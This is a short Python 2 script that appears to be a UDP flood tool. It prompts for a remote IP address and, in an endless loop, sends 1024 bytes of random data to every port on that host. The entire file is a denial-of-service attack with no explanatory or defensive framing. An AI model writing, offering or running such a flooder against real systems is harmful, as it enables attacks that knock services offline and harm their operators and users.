import socket, random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

fake_bytes = random._urandom(1024)

ip = raw_input('Remote IP:')

while True: 
    for i in xrange(1, 65535):
        sock.sendto(fake_bytes, ((ip, i)))
        
